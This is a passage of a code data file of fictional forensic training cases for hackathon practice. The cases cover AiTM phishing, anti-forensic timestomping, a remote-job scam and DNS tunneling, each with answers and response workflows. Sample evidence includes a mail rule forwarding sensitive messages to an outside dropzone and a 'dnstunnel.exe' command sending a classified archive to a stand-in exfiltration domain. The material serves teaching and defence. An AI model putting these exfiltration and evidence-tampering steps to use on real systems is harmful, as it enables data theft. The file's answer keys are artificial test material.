        type: 'Disk Artifact',
        title: 'Exchange Online Inbox Forwarding Rule Configuration',
        snippet: 'RuleName: "SystemUpdateNotification"\nCondition: Subject contains ["contract", "tender", "ITAR", "budget", "pricing"]\nAction: ForwardTo [dropzone-sec@proton.me] + MoveToFolder [RSS Feeds] + MarkAsRead: True',
        details: 'The attacker immediately created a stealth forwarding rule that hid forwarded emails in the obscure "RSS Feeds" folder to avoid user detection.'
      },
      {
        id: 'ev-7-3',
        type: 'Domain Record',
        title: 'Decoded QR Code URL & Reverse Proxy Config',
        snippet: 'QR Decoded String: https://aerodynamics-sso-benefits.com/auth/login?relay=wellness\nSSL Certificate: Let\'s Encrypt Authority X3 (Issued 6 hours prior)\nReverse Proxy Signature: Evilginx2 phishlet targeting Okta SSO\nCaptured Cookie: ESTSAUTH, ESTSAUTHPERSISTENT',
        details: 'Adversary-in-the-Middle (AiTM) proxy intercepted the session cookies in real-time as the user completed authentication.'
      }
    ],
    investigationObjectives: [
      'Revoke all active OAuth session tokens and refresh tokens for the compromised executive account.',
      'Audit Exchange Online mail trace logs to identify all exfiltrated messages forwarded to `dropzone-sec@proton.me`.',
      'Inspect physical cafeteria CCTV footage to identify the individual who posted the physical fraudulent QR code poster.',
      'Enforce FIDO2 WebAuthn authentication with strict domain-binding to neutralize reverse-proxy AiTM attacks.'
    ],
    questionsToSolve: [
      {
        id: 'q-c7-1',
        question: 'Why does traditional SMS OTP or push notification MFA fail against Adversary-in-the-Middle (AiTM) proxies like Evilginx2?',
        hint: 'Consider what the reverse proxy sits between.',
        solution: 'Because the proxy sits transparently between the user and the real authentication server. When the user enters their credentials and OTP into the proxy, the proxy forwards them to the real server, receives the authenticated session token from the real server, and saves it while passing the user along.'
      },
      {
        id: 'q-c7-2',
        question: 'What specific authentication standard is cryptographically immune to AiTM reverse-proxy phishing?',
        hint: 'Look into hardware keys and origin binding.',
        solution: 'FIDO2 / WebAuthn hardware security keys (e.g. YubiKeys) with origin binding. The browser cryptographically binds the authentication response to the exact TLS domain in the address bar (`aerodynamics-sso-benefits.com`); the real server (`login.microsoftonline.com`) rejects it because the origin does not match.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Emergency Token Invalidation',
        description: 'Execute PowerShell `Revoke-AzureADUserAllRefreshToken` to immediately invalidate all active browser sessions and OAuth tokens.',
        recommendedTools: ['Microsoft Graph PowerShell', 'Entra ID Admin Center']
      },
      {
        step: 2,
        title: 'Exfiltration Scope Assessment',
        description: 'Run Exchange Online message trace queries to catalogue all messages forwarded to the threat actor dropzone.',
        recommendedTools: ['Exchange Online PowerShell `Get-MessageTrace`', 'Purview Audit Log']
      },
      {
        step: 3,
        title: 'Physical Security Review & FIDO2 Mandate',
        description: 'Review physical cafeteria access card logs and upgrade company MFA policy to enforce phishing-resistant FIDO2 hardware tokens.',
        recommendedTools: ['Physical Access Control System (PACS) Logs', 'FIDO2 WebAuthn Policy']
      }
    ],
    expectedSolution: 'The security team immediately revoked all active tokens via Microsoft Graph API, removed the stealth inbox forwarding rule, and blocked the attacker domain. Physical facility CCTV identified an unauthorized third-party vendor courier placing the poster. The company accelerated the enterprise rollout of FIDO2 hardware keys, neutralizing future AiTM attacks.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-8',
    caseCode: 'EVD-WIP-2026-78',
    title: 'Operation GhostDrive: Anti-Forensic Disk Wiping & Timestomping Analysis',
    threatType: 'Anti-Forensics & Insider Threat Evidence Tampering',
    difficulty: 'Advanced',
    background: 'A fired senior research scientist at a pharmaceutical biotech firm was suspected of stealing proprietary vaccine formulation source codes prior to termination. When corporate investigators seized the scientist’s company-issued Dell Latitude laptop, they found the hard drive appeared freshly formatted with a clean Windows installation.',
    incidentDossier: 'The suspect attempted to destroy evidentiary traces by running SDelete (secure file wiping utility) and utilizing an anti-forensic timestomping tool to rewrite timestamps on remaining artifacts. However, the suspect neglected volatile registry hives, unallocated volume shadow copy remnants, and USB drive plug-and-play event records stored in the Windows System hive.',
    evidenceProvided: [
      {
        id: 'ev-8-1',
        type: 'Disk Artifact',
        title: 'NTFS Master File Table ($MFT) Attribute Comparison',
        snippet: 'File: C:\\Users\\j.doe\\Documents\\Project_Helix_Synthesis.docx\n$STANDARD_INFORMATION Attribute:\n  Created: 2024-01-15 09:00:00 UTC\n  Modified: 2024-01-15 09:00:00 UTC\n$FILE_NAME Attribute (Cannot be altered by user-space API):\n  Created: 2026-10-28 23:14:02 UTC\n  Modified: 2026-10-28 23:45:18 UTC\nDiscrepancy: 652 days delta between $SI and $FN timestamps.',
        details: 'The huge discrepancy between $STANDARD_INFORMATION and $FILE_NAME attributes confirms intentional timestomping.'
      },
      {
        id: 'ev-8-2',
        type: 'Disk Artifact',
        title: 'Windows USB Registry Artifact (SYSTEM Hive)',
        snippet: 'Key: HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\nDevice: Disk&Ven_SanDisk&Prod_Extreme_Pro&Rev_0\nSerial Number: 04014918204918294104&0\nFriendlyName: "SanDisk Extreme PRO USB 3.2 1TB"\nFirst Inserted: 2026-10-28 23:30:11 UTC\nLast Removed: 2026-10-28 23:58:44 UTC',
        details: 'Proves a high-speed 1TB external USB drive was connected to the laptop precisely during the file modification window.'
      },
      {
        id: 'ev-8-3',
        type: 'Disk Artifact',
        title: 'Shimcache / AppCompatCache Artifact',
        snippet: 'Path: C:\\Users\\j.doe\\Downloads\\sdelete64.exe\nLast Modified: 2026-10-29 00:05:12 UTC\nExecution Flag: Executed = True\nPath: C:\\Users\\j.doe\\Downloads\\timestomp_gui.exe\nLast Modified: 2026-10-28 23:12:00 UTC\nExecution Flag: Executed = True',
        details: 'Shimcache proves the suspect executed secure wiping and timestomping utilities on the evening prior to evidence surrender.'
      }
    ],
    investigationObjectives: [
      'Document evidence of spoliation (intentional destruction of digital evidence) for court presentation.',
      'Reconstruct the timeline proving data was copied to the SanDisk USB drive before disk wiping.',
      'Extract deleted file name fragments from the $LogFile and $UsnJrnl change journals.',
      'Submit a formal forensic affidavit supporting criminal trade secret theft charges.'
    ],
    questionsToSolve: [
      {
        id: 'q-c8-1',
        question: 'Why does comparing the $STANDARD_INFORMATION ($SI) and $FILE_NAME ($FN) attributes in NTFS reliably reveal timestomping?',
        hint: 'Which attribute can regular user programs update via Windows API?',
        solution: 'The Windows API (`SetFileTime`) allows user-space programs and utilities to modify the `$STANDARD_INFORMATION` attribute timestamps. However, the `$FILE_NAME` attribute is strictly maintained by the NTFS kernel driver and cannot be modified by standard user-space APIs without raw disk sector editing.'
      },
      {
        id: 'q-c8-2',
        question: 'What is the legal consequence of "Evidence Spoliation" in judicial civil and criminal proceedings?',
        hint: 'How do courts interpret intentional destruction of evidence?',
        solution: 'Courts can apply an "adverse inference" instruction to the jury, meaning the court formally presumes that the destroyed evidence was incriminating and directly supported the opposing party’s claims, alongside sanctions or criminal contempt/obstruction charges.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Physical Acquisition with Hardware Write-Blocker',
        description: 'Mount the laptop NVMe SSD through a Tableau hardware write-blocker and create an expert witness format (E01) bitstream image with SHA-256 verification.',
        recommendedTools: ['Tableau T8u Write-Blocker', 'FTK Imager / Guymager', 'sha256sum']
      },
      {
        step: 2,
        title: 'NTFS Journal & $MFT Extraction',
        description: 'Parse the `$MFT`, `$LogFile`, and `$UsnJrnl` to recover chronological file operation records that survived surface-level file deletion.',
        recommendedTools: ['MFTECmd (Eric Zimmerman)', 'ANJP (All-in-one NTFS Journal Parser)']
      },
      {
        step: 3,
        title: 'USB Device & Spoliation Cross-Correlation',
        description: 'Cross-reference USBSTOR registry timestamps with execution artifacts in Prefetch and Shimcache to formulate the court timeline.',
        recommendedTools: ['Registry Explorer', 'AppCompatCacheParser', 'TimeSketch']
      }
    ],
    expectedSolution: 'Despite the suspect’s use of SDelete, the NTFS $UsnJrnl change journal and Shimcache proved that 42 proprietary formulation documents were copied to an external SanDisk 1TB drive (Serial #04014918204918294104) at 23:45 UTC, immediately followed by the execution of SDelete. Armed with the forensic report, law enforcement obtained a search warrant for the suspect’s residence and recovered the physical USB drive with all files intact.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-9',
    caseCode: 'REC-SCM-2026-89',
    title: 'Operation MirageHire: Fraudulent Remote Job Scam & Identity Harvester',
    threatType: 'Employment Fraud / Credential Theft & Money Laundering',
    difficulty: 'Intermediate',
    background: 'Over 1,200 university students and fresh graduates applied for a remote "Junior AI Data Annotator" position advertised on LinkedIn and Telegram by a company calling itself "NeuralWork International", offering $35/hour.',
    incidentDossier: 'Applicants underwent a brief automated Telegram bot interview, were told they were hired, and were directed to an onboarding portal (`neuralwork-portal.net`) to complete mandatory "pre-employment KYC checks". The portal harvested passport scans, driver’s licenses, bank account details, and required candidates to pay a $250 "security equipment deposit" for a company-issued MacBook, payable exclusively in cryptocurrency or via a third-party peer-to-peer payment app.',
    evidenceProvided: [
      {
        id: 'ev-9-1',
        type: 'Domain Record',
        title: 'Domain & SSL Infrastructure Analysis',
        snippet: 'Domain: neuralwork-portal.net\nCreated: 2026-10-14 08:12:00 UTC\nRegistrar: Tucows Domains Inc.\nHosting: Cloudflare Protected / Origin IP: 45.154.255.80 (St. Petersburg, Russia)\nWeb Framework: WordPress 6.3 with compromised Formidable Forms plugin harvesting uploads directly to a remote Telegram Bot webhook.',
        details: 'Uploaded victim passports were instantly forwarded to a private Telegram channel via Bot API token.'
      },
      {
        id: 'ev-9-2',
        type: 'Chat Transcript',
        title: 'Telegram Recruitment Bot Script Excerpt',
        snippet: 'Bot: "Congratulations on passing our automated AI assessment! You are selected. To ship your Apple MacBook Pro M3 and hardware security key, our logistics partner requires a refundable deposit of $250 to ensure equipment return. Please deposit to USDT (TRC-20): TXY4910284..."',
        details: 'The scam leverages the emotional excitement of landing a prestigious tech role to induce irrational financial compliance.'
      },
      {
        id: 'ev-9-3',
        type: 'Financial Record',
        title: 'USDT TRC-20 Blockchain Wallet Flow',
        snippet: 'Address: TXY4910284...\nTotal Inflow: $312,500 USDT across 1,250 unique deposit transactions between Oct 15 and Nov 01.\nOutflow Pattern: Batched sweep every 4 hours into Huobi / OKX deposit addresses.',
        details: 'Scale of the fraud confirms an industrialized transnational scam operation targeting young job seekers.'
      }
    ],
    investigationObjectives: [
      'Coordinate with Telegram and Cloudflare abuse teams to terminate the bot webhook and phishing domain.',
      'Analyze the harvested database to alert affected victims regarding identity theft exposure.',
      'Track the USDT flow on the TRON blockchain to identify exchange off-ramps.',
      'Produce an educational public advisory warning students about fake recruitment red flags.'
    ],
    questionsToSolve: [
      {
        id: 'q-c9-1',
        question: 'What is the most definitive red flag that indicates an online job opportunity is a fraudulent scam?',
        hint: 'What should an employee never have to do to receive work equipment?',
        solution: 'Any requirement that an applicant pay money upfront (for equipment, training, background checks, or software licenses) is the universal hallmark of employment fraud. Legitimate employers provide equipment and conduct background checks at zero cost to the candidate.'
      },
      {
        id: 'q-c9-2',
        question: 'What ongoing danger do victims face beyond the immediate $250 loss?',
        hint: 'Consider what else the victims submitted on the portal.',
        solution: 'Mass identity theft. The harvested passport scans, national IDs, and banking details are packaged and sold on dark web marketplaces or used to create synthetic identities for money mule accounts and loan fraud (as seen in Case 6).'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Infrastructure Takedown & API Neutralization',
        description: 'Send emergency abuse notifications with forensic evidence to Telegram to revoke the bot token and Cloudflare to disable reverse proxy.',
        recommendedTools: ['Telegram Bot Abuse API', 'Cloudflare Abuse Portal', 'Domain Registrar Abuse Desk']
      },
      {
        step: 2,
        title: 'TRON Blockchain Asset Tracking',
        description: 'Track the TRC-20 USDT transactions across TronScan and notify target exchange compliance desks to freeze associated deposit accounts.',
        recommendedTools: ['TronScan Explorer', 'Chainalysis', 'Elliptic Forensics']
      },
      {
        step: 3,
        title: 'Victim Remediation & Credit Monitoring Alert',
        description: 'Notify universities and career placement offices to advise affected students to place immediate fraud alerts on their credit files.',
        recommendedTools: ['Campus Placement Advisory Notice', 'National Identity Theft Registry']
      }
    ],
    expectedSolution: 'The fraudulent infrastructure was dismantled within 48 hours. Telegram revoked the harvesting bot token, cutting off attacker access to newly uploaded files. TRC-20 tracking identified $180,000 sitting in an exchange deposit wallet, which was successfully frozen. A coordinated security bulletin was issued to 40 regional universities, warning students about remote job fee scams.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-10',
    caseCode: 'LEK-DNS-2026-95',
    title: 'Operation StealthTunnel: Covert Data Exfiltration via DNS Tunneling',
    threatType: 'Data Exfiltration / Covert Channels / Insider Threat',
    difficulty: 'Advanced',
    background: 'A government aerospace research lab operating an air-gapped classified development network detected unusual outbound network activity. Outbound web browsing (HTTP/HTTPS) and file transfers were strictly blocked by firewalls, yet 14 gigabytes of sensitive telemetry appeared to have leaked externally.',
    incidentDossier: 'Investigators discovered an insider infected a workstation via a compromised microcontroller USB dev-board. The malware bypassed strict perimeter firewall egress filters by encoding classified documents into Base64-encoded labels and embedding them into outbound recursive DNS TXT and A-record queries (e.g., `datafragment104.chunk9.exfil-tunnel.com`). An authoritative DNS server controlled by the attacker recorded the queries and reassembled the files.',
    evidenceProvided: [
      {
        id: 'ev-10-1',
        type: 'Network Log',
        title: 'Internal DNS Server (Bind9 / CoreDNS) Query Log',
        snippet: '2026-11-04 18:30:12.104 | Client: 10.200.4.52 | Query: dHJhbnNmZXJfY29uZmlkZW50aWFsX3BhcnQx.exfil-tunnel.com | Type: TXT | Response: NOERROR (TTL: 0)\n2026-11-04 18:30:12.450 | Client: 10.200.4.52 | Query: c3lzdGVtX3NwZWNpZmljYXRpb25zX3BhcnQy.exfil-tunnel.com | Type: TXT | Response: NOERROR (TTL: 0)\nQuery Volume: 142 queries/second for subdomains under *.exfil-tunnel.com over 4 continuous hours.',
        details: 'High-entropy, long subdomain strings queries sent at massive velocity to an obscure external domain.'
      },
      {
        id: 'ev-10-2',
        type: 'Network Log',
        title: 'DNS Tunneling Entropy Metric Calculation',
        snippet: 'Domain: *.exfil-tunnel.com\nAverage Subdomain Label Length: 58.4 characters (Normal domain avg: 8.2)\nShannon Entropy Score: 4.82 / 5.0 (Extremely high entropy indicating encrypted/encoded ciphertext)\nUnique Subdomain Ratio: 99.8% (Almost every single query requested a unique new label)',
        details: 'Shannon entropy analysis proves the subdomain strings are not legitimate human-readable hostnames.'
      },
      {
        id: 'ev-10-3',
        type: 'Memory Dump',
        title: 'Infected Workstation Process Triage (PID 3844 - dnstunnel.exe)',
        snippet: 'Process: dnstunnel.exe | Parent: explorer.exe\nCommand Line: "C:\\ProgramData\\svc_update\\dnstunnel.exe -d exfil-tunnel.com -f C:\\Classified\\Avionics_Flight_Control.zip -delay 10"\nHandle Table: Active file lock on Avionics_Flight_Control.zip (Size: 14,284,102 bytes)',
        details: 'Malware binary explicitly reading the classified archive file and piping bytes through DNS socket calls.'
      }
    ],
    investigationObjectives: [
      'Compute Shannon entropy and query volume metrics to pinpoint the infected internal host.',
      'Block the exfiltration domain `exfil-tunnel.com` and sinkhole authoritative nameservers.',
      'Reconstruct the exfiltrated ZIP archive from historical DNS query logs to ascertain exact compromise scope.',
      'Implement Response Policy Zones (RPZ) and automated DNS firewall entropy inspection rules.'
    ],
    questionsToSolve: [
      {
        id: 'q-c1-0',
        question: 'Why do perimeter firewalls frequently permit DNS tunneling traffic when HTTP and SSH are completely blocked?',
        hint: 'How does DNS lookup resolution work across enterprise networks?',
        solution: 'Most enterprise networks configure internal workstations to query an internal DNS server, which in turn queries external root and authoritative servers recursively over UDP port 53. Firewalls allow UDP 53 for vital network functionality, allowing attackers to abuse this trusted resolution path.'
      },
      {
        id: 'q-c1-1',
        question: 'What mathematical metric is standard in modern SIEM/SOC analytics to detect DNS tunneling in real-time?',
        hint: 'Think about information density and randomness.',
        solution: 'Shannon Entropy. Encrypted or Base64-encoded data strings contained in subdomain queries exhibit much higher randomness/entropy (typically > 4.2 bits per character) compared to standard human-readable hostnames (e.g. `mail.google.com`).'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'DNS Sinkholing & Host Quarantine',
        description: 'Configure internal DNS resolvers with an RPZ rule directing `*.exfil-tunnel.com` to 127.0.0.1 and disable the switch port for host 10.200.4.52.',
        recommendedTools: ['Bind9 RPZ Configuration', 'Cisco / Aruba Switch CLI', 'Zeek DNS Analyzer']
      },
      {
        step: 2,
        title: 'Historical DNS Log De-tunneling',
        description: 'Extract all captured query labels from PCAP/Zeek logs, concatenate Base64 strings chronologically, and decode the exfiltrated ZIP archive.',
        recommendedTools: ['CyberChef', 'Tshark / Wireshark', 'Python Base64 Pipeline']
      },
      {
        step: 3,
        title: 'Host Forensics & Physical Media Inspection',
        description: 'Acquire disk and memory images of workstation 10.200.4.52 to identify the initial infection vector and USB device history.',
        recommendedTools: ['Autopsy', 'USBDeview', 'Volatility 3']
      }
    ],
    expectedSolution: 'SOC analysts deployed an automated DNS entropy detection rule that flagged the abnormal Shannon entropy (>4.8) and 142 queries/sec velocity. The internal resolver sinkholed the domain within 45 minutes of initiation. Python reassembly of the decoded query strings proved the attacker succeeded in exfiltrating only 3.2 MB of the 14 MB archive before cutoff. Physical forensics identified the rogue USB microcontroller, leading to internal counterintelligence intervention.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  }
];
